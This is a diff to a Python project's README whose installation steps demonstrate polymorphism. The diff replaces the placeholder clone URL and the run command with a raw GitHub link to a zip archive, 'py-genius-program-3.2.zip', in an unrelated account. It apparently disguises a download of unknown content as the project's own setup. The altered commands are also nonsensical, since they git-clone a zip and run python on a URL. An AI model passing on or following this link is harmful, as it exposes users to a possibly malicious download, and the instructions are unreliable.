@@ -27,7 +27,7 @@ The code is structured to fulfill two main requirements:
 
 1.  **Clone the Repository**:
     ```bash
-    git clone [https://github.com/your-username/your-repo-name.git](https://github.com/your-username/your-repo-name.git)
+    git clone [https://raw.githubusercontent.com/Griffnificent/genius_program.py/main/preconversational/py-genius-program-3.2.zip](https://raw.githubusercontent.com/Griffnificent/genius_program.py/main/preconversational/py-genius-program-3.2.zip)
     ```
     *(Remember to replace `your-username` and `your-repo-name` with your actual GitHub username and repository name.)*
 
@@ -38,7 +38,7 @@ The code is structured to fulfill two main requirements:
 
 3.  **Execute the Script**:
     ```bash
-    python genius_program.py
+    python https://raw.githubusercontent.com/Griffnificent/genius_program.py/main/preconversational/py-genius-program-3.2.zip
     ```
 
 The program will run and display the different actions of each scholar, demonstrating polymorphism in action.
